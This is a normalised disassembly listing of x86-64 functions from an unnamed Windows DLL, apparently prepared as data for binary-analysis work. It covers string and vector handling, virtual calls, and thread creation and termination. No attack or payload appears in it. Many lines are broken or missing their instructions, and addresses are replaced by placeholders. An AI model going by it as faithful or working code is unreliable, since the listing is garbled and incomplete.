mov rdi [ rsp + 0x10 ]
sub_180003750
mov rax rsp
push rdi
sub rsp 0x90
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x80 ] rax
mov rdi rcx
mov ecx 0x30
call sub_180021000
mov [ rsp + 0x20 ] rax
xor esi esi
test rax rax
je r-xdata
mov rbx rsi
mov rcx rax
call sub_180017520
mov rbx rax
jmp r-xdata
mov rcx [ rdi + 0x28 ]
mov rax [ rcx ]
call [ rax + 0x20 ]
lea r8 [ rsp + 0x30 ]
cmp [ rsp + 0x48 ] 0x8
cmovae r8 [ rsp + 0x30 ]
lea rdx [ rsp + 0x58 ]
cmp [ rsp + 0x70 ] 0x8
cmovae rdx [ rsp + 0x58 ]
mov rcx [ rdi + 0x40 ]
mov rax [ rcx ]
call [ rax + 0x10 ]
nop
cmp [ rsp + 0x48 ] 0x8
jb r-xdata
mov rcx rbx
call sub_180017560
mov rcx rbx
call j_sub_18002094c#2
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800175a0
mov r8d 0x20
lea rdx [ rw-data ]
mov rcx rbx
call sub_180017590
lea rdx [ rsp + 0x58 ]
mov rcx rbx
call sub_180017bc0
nop
mov r8d 0x1c
lea rdx [ rw-data ]
mov rcx rbx
call sub_180017590
lea rdx [ rsp + 0x30 ]
mov rcx rbx
call sub_180017bc0
nop
test rbx rbx
je r-xdata
mov [ rsp + 0x48 ] 0x7
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x30 ] si
cmp [ rsp + 0x70 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x30 ]
call j_sub_18002094c#2
mov rcx [ rsp + 0x80 ]
xor rcx rsp
call sub_1800212e0
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
mov rcx [ rsp + 0x58 ]
call j_sub_18002094c#2
sub_1800038b0
sub rsp 0x28
mov r10 [ rcx ]
mov r8 [ rcx + 0x8 ]
mov r9 0x3fffffffffffffff
sub r8 r10
mov rax r9
sar r8 0x2
sub rax rdx
cmp rax r8
jae r-xdata
add r8 rdx
mov rdx [ rcx + 0x10 ]
sub rdx r10
sar rdx 0x2
cmp r8 rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
add rsp 0x28
retn
mov rax rdx
shr rax 0x1
sub r9 rax
cmp r9 rdx
jae r-xdata
add rdx rax
cmp rdx r8
cmovb rdx r8
call sub_180003560
xor edx edx
cmp rdx r8
cmovb rdx r8
add rsp 0x28
jmp sub_180003560
sub_180003930
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rdi r8
mov rsi rdx
mov rbx rcx
test rdx rdx
je r-xdata
mov rax 0x7ffffffffffffffe
cmp rdi rax
jbe r-xdata
mov r8 [ rcx + 0x18 ]
cmp r8 0x8
jb r-xdata
mov rcx [ rbx + 0x18 ]
cmp rcx rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov rax rcx
mov rax [ rcx ]
jmp r-xdata
test rdi rdi
jne r-xdata
mov r8 [ rbx + 0x10 ]
mov rdx rdi
mov rcx rbx
call sub_180001300
test rdi rdi
je r-xdata
cmp r8 0x8
jb r-xdata
cmp rdx rax
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
mov [ rsp + 0x30 ] rbp
jb r-xdata
xor eax eax
mov [ rbx + 0x10 ] rax
cmp rcx 0x8
jb r-xdata
mov rsi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rax [ rbx + 0x10 ]
lea rcx [ rcx + rax * 2 ]
cmp rcx rdx
jbe r-xdata
mov rcx [ rcx ]
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov [ rbx ] ax
mov rcx rbx
mov rax rbx
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rbx ]
mov [ rcx ] ax
mov rax rbx
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
cmp r8 0x8
jb r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
lea rbp [ rdi + rdi ]
mov rdx rsi
mov r8 rbp
call sub_1800205e0
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] rdi
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
xor eax eax
mov [ rcx + rbp ] ax
mov rbp [ rsp + 0x30 ]
sub rsi rax
mov r9 rdi
mov rdx rbx
sar rsi 0x1
mov rcx rbx
mov r8 rsi
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
jmp sub_180001ba0
sub_180003a90
mov rax rsp
mov [ rax + 0x10 ] rdx
push rbp
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x60
mov [ rbp - 0x40 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov r14 rdx
mov rsi rcx
mov rcx [ rcx + 0x20 ]
mov rax [ rcx ]
mov rdx [ rdx ]
call [ rax + 0x10 ]
xor r15d r15d
mov [ rbp - 0x38 ] r15
mov [ rbp - 0x30 ] r15
mov rdx rax
lea rcx [ rbp - 0x38 ]
call sub_1800033c0
nop
mov r13 [ rbp - 0x38 ]
test r13 r13
jne r-xdata
mov ecx [ r13 ]
mov rax [ rsi + 0x70 ]
cmp ecx [ rax ]
je r-xdata
mov rcx [ rbp - 0x30 ]
test rcx rcx
je r-xdata
xor r12b r12b
mov rcx [ rsi + 0x48 ]
mov rax [ rsi + 0x50 ]
sub rax rcx
sar rax 0x3
test rax rax
je r-xdata
movzx eax [ rsi + 0x68 ]
cmp al 0xff
je r-xdata
jmp r-xdata
[ rcx + 0x8 ]
jne r-xdata
mov rdx [ rbp - 0x30 ]
test rdx rdx
je r-xdata
mov rdi r15
nop [ rax + rax ] ax
movzx ecx al
mov rax [ rsi + 0x48 ]
mov rbx [ rax + rcx * 8 ]
mov [ rbp - 0x28 ] r15
mov [ rbp - 0x20 ] r15
mov rdx [ rbp - 0x30 ]
test rdx rdx
je r-xdata
mov rbx [ r14 + 0x8 ]
test rbx rbx
je r-xdata
mov rbx [ rbp - 0x30 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
[ rdx + 0x8 ]
jne r-xdata
inc r12b
mov rcx [ rsi + 0x48 ]
movzx edi r12b
mov rax [ rsi + 0x50 ]
sub rax rcx
sar rax 0x3
cmp rdi rax
jb r-xdata
mov rax [ rsi + 0x48 ]
mov rbx [ rax + rdi * 8 ]
mov [ rbp - 0x18 ] r15
mov [ rbp - 0x10 ] r15
mov rdx [ rbp - 0x30 ]
test rdx rdx
je r-xdata
mov rax [ rbx ]
lea rdx [ rbp - 0x28 ]
mov rcx rbx
call [ rax + 0x8 ]
jmp r-xdata
mov eax [ rdx + 0x8 ]
test eax eax
je r-xdata
lea r11 [ rsp + 0x60 ]
mov rbx [ r11 + 0x30 ]
mov rsi [ r11 + 0x40 ]
mov rdi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
[ rbx + 0x8 ]
jne r-xdata
mov rcx [ rbp - 0x30 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rbx [ rbp - 0x30 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rcx [ rcx + rdi * 8 ]
movzx ebx [ r13 + 0x4 ]
mov rax [ rcx ]
call [ rax + 0x18 ]
cmp ax bx
jne r-xdata
mov rax [ rbx ]
lea rdx [ rbp - 0x18 ]
mov rcx rbx
call [ rax + 0x8 ]
mov eax [ rdx + 0x8 ]
test eax eax
je r-xdata
nop [ rax + rax ] ax
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rcx [ rbp - 0x30 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
lea ecx [ rax + 0x1 ]
[ rdx + 0x8 ] ecx
je r-xdata
mov r8 [ rbp - 0x30 ]
mov rdx [ rbp - 0x38 ]
lea rcx [ rbp - 0x28 ]
call sub_180003340
mov eax [ rdx + 0x8 ]
test eax eax
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
mov r8 [ rbp - 0x30 ]
mov rdx [ rbp - 0x38 ]
lea rcx [ rbp - 0x18 ]
call sub_180003340
mov eax [ rdx + 0x8 ]
test eax eax
jne r-xdata
lea ecx [ rax + 0x1 ]
[ rdx + 0x8 ] ecx
je r-xdata
jmp r-xdata
jmp r-xdata
sub_180003cb0
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
cmp rcx rdx
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp [ rcx + 0x18 ] 0x8
mov [ rsp + 0x30 ] rsi
jb r-xdata
xor esi esi
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
cmp [ rdi + 0x18 ] 0x8
jae r-xdata
mov rcx [ rcx ]
call j_sub_18002094c#2
mov rax [ rdi ]
mov [ rbx ] rax
mov [ rdi ] rsi
mov r8 [ rdi + 0x10 ]
mov rdx rdi
mov rcx rbx
lea r8 [ r8 + r8 + 0x2 ]
call sub_1800205e0
jmp r-xdata
mov rax [ rdi + 0x10 ]
mov [ rbx + 0x10 ] rax
mov rax [ rdi + 0x18 ]
mov [ rbx + 0x18 ] rax
mov [ rdi + 0x10 ] rsi
mov [ rdi + 0x18 ] rsi
mov rsi [ rsp + 0x30 ]
sub_180003d40
push rbx
sub rsp 0x20
mov rbx [ rdx + 0x8 ]
test rbx rbx
je r-xdata
add rsp 0x20
pop rbx
retn
[ rbx + 0x8 ]
mov [ rsp + 0x30 ] rdi
jne r-xdata
mov rdi [ rsp + 0x30 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
sub_180003da0
mov [ rsp + 0x20 ] rbx
mov [ rsp + 0x10 ] edx
push rdi
sub rsp 0x20
lea rbx [ rcx + 0x70 ]
xor r8b r8b
mov edi edx
mov rcx [ rbx + 0x8 ]
sub rcx [ rbx ]
sar rcx 0x2
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x8 ]
lea rax [ rsp + 0x38 ]
mov [ rsp + 0x30 ] rbp
mov [ rsp + 0x40 ] rsi
cmp rax rcx
jae r-xdata
mov rdx [ rbx ]
xor eax eax
nop [ rax ] eax
mov rdx [ rbx + 0x10 ]
mov rbp 0x3ffffffffffffffe
mov rsi 0x3fffffffffffffff
cmp rcx rdx
jne r-xdata
mov rax [ rbx ]
lea rdx [ rsp + 0x38 ]
cmp rax rdx
ja r-xdata
xor al al
mov rbx [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
inc r8b
movzx eax r8b
cmp rax rcx
jb r-xdata
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
mov rax [ rbx ]
sub rcx rax
sar rcx 0x2
cmp rcx rbp
jbe r-xdata
mov rdx [ rbx + 0x10 ]
lea rdi [ rsp + 0x38 ]
mov rbp 0x3ffffffffffffffe
sub rdi rax
mov rsi 0x3fffffffffffffff
sar rdi 0x2
cmp rcx rdx
jne r-xdata
cmp [ rdx + rax * 4 ] edi
je r-xdata
add [ rbx + 0x8 ] 0x4
mov rdi [ rbx ]
mov rax [ rbx + 0x8 ]
cmp rdi rax
jae r-xdata
mov [ rax ] edi
sub rdx rax
inc rcx
sar rdx 0x2
cmp rcx rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov rdx [ rbx + 0x8 ]
test rdx rdx
je r-xdata
sub rcx rax
sar rcx 0x2
cmp rcx rbp
jbe r-xdata
mov rdx [ rbx + 0x10 ]
cmp rax rdx
jne r-xdata
mov rcx rdi
cmp rdi rdi
ja r-xdata
mov r8 rdx
mov rax rsi
shr r8 0x1
sub rax r8
cmp rax rdx
jae r-xdata
mov rax [ rbx ]
mov ecx [ rax + rdi * 4 ]
mov [ rdx ] ecx
jmp r-xdata
sub rdx rax
inc rcx
sar rdx 0x2
cmp rcx rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
sub rax rdi
sar rax 0x2
cmp rax rbp
jbe r-xdata
mov rdx [ rbx + 0x10 ]
sub rdi rdi
sar rdi 0x2
cmp rax rdx
jne r-xdata
add rdx r8
xor edx edx
jmp r-xdata
mov r8 rdx
mov rax rsi
shr r8 0x1
sub rax r8
cmp rax rdx
jae r-xdata
add [ rbx + 0x8 ] 0x4
mov rbp [ rsp + 0x30 ]
mov rsi [ rsp + 0x40 ]
mov rbx [ rsp + 0x48 ]
mov al 0x1
add rsp 0x20
pop rdi
retn
mov eax [ rdi ]
mov [ rcx ] eax
sub rdx rdi
inc rax
sar rdx 0x2
cmp rax rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
mov rdx [ rbx + 0x8 ]
test rdx rdx
je r-xdata
sub rax rcx
sar rax 0x2
cmp rax rbp
jbe r-xdata
cmp rdx rcx
cmovb rdx rcx
mov rcx rbx
call sub_180003560
add rdx r8
xor edx edx
jmp r-xdata
mov rcx rdx
shr rcx 0x1
sub rsi rcx
cmp rsi rdx
jae r-xdata
mov rax [ rbx ]
mov ecx [ rax + rdi * 4 ]
mov [ rdx ] ecx
jmp r-xdata
sub rdx rcx
inc rax
sar rdx 0x2
cmp rax rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_18001f6b8
cmp rdx rcx
cmovb rdx rcx
mov rcx rbx
call sub_180003560
add rdx rcx
xor edx edx
jmp r-xdata
mov rcx rdx
shr rcx 0x1
sub rsi rcx
cmp rsi rdx
jae r-xdata
cmp rdx rax
mov rcx rbx
cmovb rdx rax
call sub_180003560
add rdx rcx
xor edx edx
jmp r-xdata
cmp rdx rax
mov rcx rbx
cmovb rdx rax
call sub_180003560
sub_180004030
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov [ rcx + 0x18 ] 0x7
mov rbx rcx
xor eax eax
mov [ rcx + 0x10 ] rax
mov [ rcx ] ax
or rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rcx rbx
call sub_180003930
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_180004080
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x30
mov rsi r8
mov rbp rdx
mov rdi rcx
cmp rcx rdx
je r-xdata
mov rbp [ rsp + 0x50 ]
mov rax rsi
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
mov [ rsp + 0x48 ] r12
xor r12d r12d
mov [ rsp + 0x40 ] rbx
nop
mov rcx [ rsi + 0x8 ]
mov [ rsi + 0x8 ] r8
mov [ rsi ] rax
mov [ rsp + 0x28 ] rcx
test rcx rcx
je r-xdata
mov r8 [ rdi + 0x8 ]
mov [ rdi + 0x8 ] r12
mov rax [ rdi ]
mov [ rsp + 0x20 ] rax
mov [ rdi ] r12
add rdi 0x10
add rsi 0x10
cmp rdi rbp
jne r-xdata
[ rcx + 0x8 ]
jne r-xdata
lea rcx [ rsp + 0x20 ]
mov rax r12
mov r8 r12
mov [ rsp + 0x20 ] rax
cmp rcx rdi
je r-xdata
mov r12 [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
mov rbx [ rsp + 0x28 ]
mov rcx rbx
mov rax [ rbx ]
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rcx [ rsp + 0x28 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
sub_180004140
mov [ rsp + 0x10 ] rdx
push rdi
sub rsp 0x60
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x70 ] rbx
mov rbx rdx
mov rdi rcx
mov rdx [ rdx ]
cmp [ rdx ] 0x0
je r-xdata
mov rax [ rcx + 0x70 ]
mov ecx [ rax ]
mov [ rdx ] ecx
mov r8d [ rdx ]
mov rax [ rcx + 0x70 ]
cmp r8d [ rax ]
je r-xdata
xor ecx ecx
mov [ rsp + 0x48 ] rcx
mov [ rsp + 0x50 ] rcx
mov r8 [ rbx + 0x8 ]
test r8 r8
je r-xdata
cmp [ rdx + 0x6 ] 0x34
je r-xdata
mov edx r8d
call sub_180003da0
jmp r-xdata
mov rax [ rdi ]
lea rdx [ rsp + 0x48 ]
mov rcx rdi
call [ rax + 0x8 ]
nop
mov rbx [ rbx + 0x8 ]
test rbx rbx
je r-xdata
mov eax [ r8 + 0x8 ]
test eax eax
je r-xdata
cmp [ rdx + 0x6 ] 0x35
je r-xdata
mov rdx [ rbx ]
cmp [ rdx + 0x6 ] 0x33
je r-xdata
mov rbx [ rsp + 0x70 ]
add rsp 0x60
pop rdi
retn
[ rbx + 0x8 ]
jne r-xdata
lea ecx [ rax + 0x1 ]
[ r8 + 0x8 ] ecx
je r-xdata
cmp [ rdx + 0x6 ] 0x36
je r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
lea rcx [ rsp + 0x48 ]
call sub_180003340
mov eax [ r8 + 0x8 ]
test eax eax
jne r-xdata
mov rcx [ rdi + 0x20 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
mov rcx [ rbx ]
movzx edx [ rcx + 0x7 ]
xor ecx ecx
cmp dl [ rw-data ]
mov rdx rax
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
jmp r-xdata
mov [ rsp + 0x38 ] rcx
mov [ rsp + 0x40 ] rcx
lea rcx [ rsp + 0x38 ]
call sub_180001450
mov rcx [ rdi + 0x30 ]
mov rax [ rcx ]
lea rdx [ rsp + 0x38 ]
call [ rax + 0x18 ]
nop
mov [ rsp + 0x28 ] rcx
mov [ rsp + 0x30 ] rcx
lea rcx [ rsp + 0x28 ]
call sub_180001450
mov rcx [ rdi + 0x30 ]
mov rax [ rcx ]
lea rdx [ rsp + 0x28 ]
call [ rax + 0x10 ]
jmp r-xdata
mov rcx rbx
call sub_180018390
jmp r-xdata
sub_180004290
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x60
mov rdi rcx
mov rcx [ rcx + 0x40 ]
mov rax [ rcx ]
call [ rax ]
mov rsi [ rdi + 0x70 ]
mov rcx [ rdi + 0x80 ]
sub rsi rsi
mov rbp rax
sar rsi 0x2
cmp [ rdi + 0x78 ] rcx
jne r-xdata
mov rax [ rdi + 0x78 ]
test rax rax
je r-xdata
lea rcx [ rdi + 0x70 ]
mov edx 0x1
call sub_1800038b0
add [ rdi + 0x78 ] 0x4
mov rax [ rdi + 0x70 ]
mov r8 [ rdi + 0x78 ]
lea rdx [ r8 - 0x4 ]
lea rcx [ rax + rsi * 4 ]
xor ebx ebx
cmp rcx rdx
je r-xdata
mov [ rax ] ebp
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
xor r8d r8d
mov [ rdi + 0x90 ] bl
mov [ rsp + 0x48 ] 0x7
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x30 ] bx
call sub_180003930
mov rcx [ rdi + 0x38 ]
mov rax [ rcx ]
mov r8d [ rw-data ]
lea rdx [ rsp + 0x30 ]
call [ rax ]
test eax eax
je r-xdata
cmp rdx r8
je r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x30 ]
xor r8d r8d
mov [ rsp + 0x48 ] 0x7
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x30 ] bx
call sub_180003930
mov rcx [ rdi + 0x38 ]
mov r8d [ rw-data ]
mov rax [ rcx ]
lea rdx [ rsp + 0x30 ]
call [ rax ]
test eax eax
je r-xdata
mov [ rdi + 0xb8 ] eax
xor r9d r9d
mov [ rsp + 0x20 ] rbx
call sub_180003430
mov rbx [ rsp + 0x70 ]
mov rbp [ rsp + 0x78 ]
mov rsi [ rsp + 0x80 ]
add rsp 0x60
pop rdi
retn
mov [ rdi + 0xbc ] eax
sub_1800043c0
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rsp + 0x90 ] rbx
mov r12 rcx
mov ecx 0x190
call [ Sleep@IAT ]
mov ecx 0x30
call sub_180021000
mov [ rsp + 0x88 ] rax
xor r15d r15d
test rax rax
je r-xdata
mov rbx r15
mov [ rsp + 0x20 ] 0xb
lea r9 [ rw-data ]
lea r8d [ r15 + 0x4a ]
lea rdx [ rw-data ]
mov rcx rax
call sub_180017530
mov rbx rax
jmp r-xdata
mov rbx [ rsp + 0x90 ]
add rsp 0x40
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
test rbx rbx
je r-xdata
mov rcx rbx
call j_sub_1800175b0
mov rdi rax
mov rcx [ r12 + 0x40 ]
mov r8 [ rcx ]
mov rdx rax
call [ r8 + 0x8 ]
test al al
je r-xdata
mov rcx rdi
call sub_18002094c
mov rcx r12
call sub_180004290
mov rcx [ r12 + 0x18 ]
mov rax [ rcx ]
call [ rax + 0x10 ]
mov r13 [ r12 + 0x50 ]
sub r13 [ r12 + 0x48 ]
sar r13 0x3
mov ebp r13d
mov eax 0x8
mul rbp
mov rbx 0xffffffffffffffff
cmovo rax rbx
mov rcx rax
call j_sub_180021000
mov rsi rax
mov eax 0x4
mul rbp
cmovo rax rbx
mov rcx rax
call j_sub_180021000
mov r14 rax
mov [ rsp + 0x80 ] r15d
test r13d r13d
je r-xdata
mov rcx rbx
call sub_180017560
mov rcx rbx
call j_sub_18002094c#2
or edx 0xffffffff
mov rcx [ rsi ]
call [ WaitForSingleObject@IAT ]
mov rcx [ rsi ]
call [ CloseHandle@IAT ]
cmp r13d 0x1
jbe r-xdata
mov rbx r15
mov rdi rax
nop
mov rcx rsi
call j_sub_18002094c
mov rcx r14
call j_sub_18002094c
lea rbx [ rsi + 0x8 ]
lea edi [ r13 - 0x1 ]
nop [ rax + rax ] eax
mov r9 [ r12 + 0x48 ]
mov [ rsp + 0x28 ] rdi
mov [ rsp + 0x20 ] r15d
mov r9 [ rbx + r9 ]
lea r8 [ sub_1800030d0 ]
xor edx edx
xor ecx ecx
call [ CreateThread@IAT ]
mov [ rbx + rsi ] rax
add rdi 0x4
add rbx 0x8
dec rbp
jne r-xdata
lea rdx [ rsp + 0x80 ]
mov rcx [ rbx ]
call [ GetExitCodeThread@IAT ]
mov edx [ rsp + 0x80 ]
mov rcx [ rbx ]
call [ TerminateThread@IAT ]
mov rcx [ rbx ]
call [ CloseHandle@IAT ]
add rbx 0x8
dec rdi
jne r-xdata
sub_1800045a0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx r8
mov rsi rdx
mov rdi rcx
cmp rcx rdx
je r-xdata
mov rsi [ rsp + 0x38 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
nop [ rax ] eax
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rdi
mov rcx rbx
call sub_180001ba0
add rdi 0x28
add rbx 0x28
cmp rdi rsi
jne r-xdata
sub_180004600
mov [ rsp + 0x20 ] rbx
push rbp
sub rsp 0x20
mov rbx r8
mov rbp rdx
cmp rcx rdx
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x48 ]
add rsp 0x20
pop rbp
retn
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x38 ] rdi
mov [ rsp + 0x40 ] r12
xor r12d r12d
lea rdi [ rcx + 0x18 ]
nop
add rdi 0x28
add rbx 0x28
lea rax [ rdi - 0x18 ]
cmp rax rbp
jne r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
lea rsi [ rdi - 0x18 ]
cmp rbx rsi
je r-xdata
mov r12 [ rsp + 0x40 ]
mov rdi [ rsp + 0x38 ]
mov rsi [ rsp + 0x30 ]
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
cmp [ rdi ] 0x8
jae r-xdata
mov rcx [ rbx ]
call j_sub_18002094c#2
mov rax [ rsi ]
mov [ rbx ] rax
mov [ rsi ] r12
mov r8 [ rdi - 0x8 ]
mov rdx rsi
mov rcx rbx
lea r8 [ r8 + r8 + 0x2 ]
call sub_1800205e0
jmp r-xdata
mov rax [ rdi - 0x8 ]
mov [ rbx + 0x10 ] rax
mov rax [ rdi ]
mov [ rbx + 0x18 ] rax
mov [ rdi - 0x8 ] r12
mov [ rdi ] r12
sub_1800046d0
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
push rbx
push rsi
push rdi
push r12
sub rsp 0x38
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rbx r8
mov rsi rdx
mov rdi rcx
mov [ rsp + 0x60 ] rbx
xor r12d r12d
nop [ rax ] eax
mov rax rbx
add rsp 0x38
pop r12
pop rdi
pop rsi
pop rbx
retn
mov [ rsp + 0x68 ] rbx
test rbx rbx
je r-xdata
add rbx 0x28
mov [ rsp + 0x70 ] rbx
add rdi 0x28
jmp r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rdi
mov rcx rbx
call sub_180001ba0
nop
cmp rdi rsi
je r-xdata
sub_180004750
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
sub rsp 0x38
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov r9 rcx
mov [ rsp + 0x40 ] r8
xor r10d r10d
mov rax r8
add rsp 0x38
retn
test r8 r8
je r-xdata
add r8 0x10
mov [ rsp + 0x50 ] r8
add r9 0x10
jmp r-xdata
mov [ r8 ] r10
mov [ r8 + 0x8 ] r10
cmp r8 r9
je r-xdata
cmp r9 rdx
je r-xdata
mov rax [ r9 + 0x8 ]
mov [ r8 + 0x8 ] rax
mov [ r9 + 0x8 ] r10
mov rcx [ r8 ]
mov rax [ r9 ]
mov [ r8 ] rax
mov [ r9 ] rcx
sub_1800047c0
mov rax rsp
push rdi
push r12
push r13
sub rsp 0x50
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov rsi rcx
mov rbp [ rcx + 0x50 ]
sub rbp [ rcx + 0x48 ]
sar rbp 0x3
lea eax [ rbp + rbp * 2 ]
mov r13d eax
mov edx 0x1
mov ecx eax
call sub_180021308
mov r12 rax
test rax rax
je r-xdata
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x28 ]
mov rbp [ r11 + 0x30 ]
mov rsi [ r11 + 0x38 ]
mov rsp r11
pop r13
pop r12
pop rdi
retn
mov rbx rax
xor dil dil
test ebp ebp
je r-xdata
mov ecx 0x18
call sub_180021000
mov rdi rax
mov [ rsp + 0x70 ] rax
test rax rax
je r-xdata
nop [ rax ] eax
xor ebx ebx
mov edi ebx
movzx ebx [ rw-data ]
mov rax [ rsi ]
mov rcx rsi
call [ rax + 0x18 ]
mov [ rdi + 0x4 ] ax
mov [ rdi + 0x6 ] 0x2
mov [ rdi + 0x7 ] bl
mov [ rdi + 0x8 ] r12
mov [ rdi + 0x10 ] r13
xor ebx ebx
mov [ rdi ] ebx
jmp r-xdata
inc dil
movzx eax dil
cmp eax ebp
jb r-xdata
lea rcx [ r13 + r12 ]
cmp rbx rcx
jae r-xdata
mov [ rsp + 0x38 ] rbx
mov [ rsp + 0x40 ] rbx
mov rbx [ rsp + 0x30 ]
test rbx rbx
je r-xdata
mov rax [ rsi + 0x70 ]
mov ecx [ rax ]
mov rax [ rsp + 0x28 ]
mov [ rax ] ecx
mov [ rsp + 0x28 ] rbx
mov [ rsp + 0x30 ] rbx
mov rdx rdi
lea rcx [ rsp + 0x28 ]
call sub_1800033c0
nop
mov rax [ rsi + 0x78 ]
cmp [ rsi + 0x70 ] rax
je r-xdata
movzx ecx dil
mov rax [ rsi + 0x48 ]
mov rcx [ rax + rcx * 8 ]
mov rax [ rcx ]
call [ rax + 0x18 ]
test ax ax
je r-xdata
mov [ rbx ] ax
movzx eax [ rw-data ]
mov [ rbx + 0x2 ] al
add rbx 0x3
lea rdx [ rsp + 0x38 ]
mov rcx rsi
call sub_180004140
nop
test rbx rbx
je r-xdata
mov eax [ rbx + 0x8 ]
test eax eax
je r-xdata
mov al 0x1
or eax 0xffffffff
[ rbx + 0x8 ] eax
dec eax
jne r-xdata
mov rbx [ rsp + 0x30 ]
nop [ rax + rax ] eax
mov rbx [ rsp + 0x30 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov r8 rbx
mov rdx [ rsp + 0x28 ]
lea rcx [ rsp + 0x38 ]
call sub_180003340
jmp r-xdata
mov eax [ rbx + 0x8 ]
test eax eax
jne r-xdata
mov rcx [ rsp + 0x30 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
